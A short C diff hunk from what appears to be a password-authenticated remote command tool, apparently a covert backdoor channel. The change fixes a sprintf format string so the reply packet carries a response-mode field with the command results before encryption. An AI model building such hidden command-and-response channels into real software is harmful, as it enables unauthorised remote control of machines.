@@ -325,7 +325,7 @@ int process_command(char * command, const struct ip_struct * ip, const int dest_
 	{
 		cmd_results[strlen(cmd_results)-1] = '\0';
 		//Format packet payload
-		sprintf(packet, "%s %d %s%s%s" /* "%s %d %s%d%s%s" */, PASSWORD, CLIENT_MODE, CMD_START, /* RESPONSE_MODE,*/cmd_results, CMD_END);
+		sprintf(packet, /*"%s %d %s%s%s" */ "%s %d %s%d%s%s" , PASSWORD, CLIENT_MODE, CMD_START, RESPONSE_MODE, cmd_results, CMD_END);
 		printf("Packet: %s\n", packet);
 		//Encrypt payload
 		
